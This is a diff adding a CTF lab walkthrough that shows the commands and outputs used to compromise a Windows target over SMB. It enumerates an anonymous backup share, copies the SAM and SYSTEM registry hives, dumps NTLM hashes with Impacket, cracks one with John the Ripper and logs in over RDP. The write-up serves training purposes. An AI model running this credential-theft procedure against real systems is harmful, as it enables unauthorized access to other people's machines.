@@ -1,0 +1,50 @@
+
+📤Main Focuses of Box:
+1. SMB Enumeration & Misconfigurations: Discovering and accessing a poorly secured backup network share that allowed unauthorized read access to sensitive system files.  
+2. Credential Harvesting: Extracting the SAM and SYSTEM registry files and using Impacket to dump local NTLM password hashes.  
+3. Offline Password Cracking: Utilizing John the Ripper alongside the rockyou.txt wordlist to crack the dumped hash and reveal the plaintext password.  
+4. Remote Desktop Access: Leveraging the cracked plaintext credentials to establish a graphical session via RDP (xfreerdp) and navigate the host environment.
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+🏴‍☠️CTF Walkthrough:
+
+1.Conducted network reconnaissance utilizing nmap to identify exposed SMB and RDP services.
+command: sudo nmap -sV -sC 10.129.5.163
+output: Revealed open ports 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds), 3389 (ms-wbt-server/RDP), and 5985 (http), along with the hostname AWAY.
+
+2.I then enumerated share permissions with smbclient and smbmap to locate accessible system folders, files, backups, etc.
+command: smbclient -N -L 10.129.5.163
+output: Listed available shares including `ADMIN$`, `backup`, `C$`, and `IPC$`.
+
+3.I then utilized smbmap to enumerate specific share permissions, confirming read access to the backup share.
+command: smbmap -H 10.129.5.163
+output: Revealed that the `backup` and `IPC$` shares had `READ ONLY` permissions, while `ADMIN$` and `C$` had `NO ACCESS`.
+
+4.I connected to the accessible backup share to investigate its contents.
+command: smbclient -N //10.129.5.163/backup
+output: Listed the directory contents, revealing a `SAM` file of size 45056 and a `SYSTEM` file of size 14036992.
+
+5.I downloaded the SAM and SYSTEM registry files to my local machine.
+command: get SAM
+command: get SYSTEM
+output: `getting file \SAM of size 45056 as SAM...` (successfully downloaded both files to the local machine).
+
+6.I extracted the local NTLM hashes from the registry files utilizing Impacket.
+command: impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+output: Dumped the local SAM hashes, revealing the NTLM hash for the user "folka" (`folka:1002:...:5962cc080506d90be8943118f968e164:::`).
+
+7.I saved the revealed NTLM password hash for the user "folka" into a text file.
+command: echo "5962cc080506d90be8943118f968e164" > hash.txt
+output: Silently wrote the hash string into `hash.txt` in the current working directory.
+
+8.I decompressed the rockyou wordlist to prepare for offline password cracking.
+command: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+output: Silently extracted the wordlist archive.
+
+9.I ran an offline password cracking attack against the saved hash using John the Ripper.
+command: john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+output: `Loaded 1 password hash...` and successfully cracked the hash to reveal the plaintext password `internet`.
+
+10. I connected to the target system via RDP using the cracked credentials to establish a remote graphical session.
+command: xfreerdp /v:10.129.5.163 /u:folka /p:'internet' /dynamic-resolution
+output: Established a remote GUI session on the target machine as the user folka, allowing navigation to the desktop to open the `user` file and retrieve the flag `xxx...`.
